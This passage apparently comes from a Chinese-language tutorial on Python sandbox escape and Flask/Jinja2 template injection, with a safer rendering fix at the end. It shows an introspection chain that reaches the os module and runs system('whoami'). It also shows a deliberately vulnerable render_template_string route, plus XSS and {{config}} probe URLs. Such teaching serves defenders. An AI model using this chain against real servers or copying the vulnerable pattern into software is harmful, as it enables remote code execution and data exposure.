['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']

```
查看 linecache(操作文件的函数）

```python
`[].__class__.__base__.__subclasses__([60].__init__.func_globals['linecache'].__dict__.keys()`
`['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']`
 
```
可以看到这里调用了 os 模块, 所以可以直接调用 os 模块

```python
a=[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]

a
<module 'os' from '*****\python27\lib\os.pyc'>

```

接着要调用 os 的 system 方法, 先查看 system 的位置:

```python
a.__dict__.keys().index('system')
79
a.__dict__.keys()[79]
'system'
b=a.__dict__.values()[79]
b
<built-in function system>
b('whoami')
```
python模板注入ssti

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191013164020897-352800982.png)

```python
code = request.args.get('ssti')
    html = '''
        <h1>qing -SSIT</h1>
        <h2>The ssti is </h2>
            <h3>%s</h3>
        ''' % (code)
    return render_template_string(html)
```

这里把ssti变量动态的输出在%s,然后进过render_template_string渲染模版，单独ssti注入成因就在这里。

这里前端输出了 XSS问题肯定是存在的

http://127.0.0.1:5000/qing?ssti=%3Cscript%3Ealert(/qing/)%3C/script%3E

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191013165116630-1626199707.png)

继续SSTI注入  前面说了Jinja2变量解析

控制结构 {% %}

变量取值 {{ }}

注释 {# #}

我们这里进行变量测试

http://127.0.0.1:5000/qing?ssti={{2*2}}

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191013170013103-1452841122.png)

 flask中也有一些全局变量
 
 http://127.0.0.1:5000/qing?ssti={{config}}
 
 ![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191013214137250-1253873228.png)
 
 防止SSTI注入的最简单方法
 ```python
 code = request.args.get('ssti')
    html = '''
        <h1>qing -SSIT</h1>
        <h2>The ssti is </h2>
            <h3>{{code}}</h3>
        ''' 
    return render_template_string(html)
```
 将template 中的 ”’<h3> %s!</h3>”’ % code更改为 ”’<h3>{{code}}</h3>”’ ，这样以来，Jinja2在模板渲染的时候将request.url的值替换掉{{code}}, 而不会对code内容进行二次渲染

这样即使code中含有{{}}也不会进行渲染，而只是把它当做普通字符串

![](https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8vv7KaA050aUefyTRxicXz0y2CG8tnpiaicdPib12icgzq4LBiaZTTvnJhlkppP26ibiaUtpib3HrqquXw42cQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

补加图

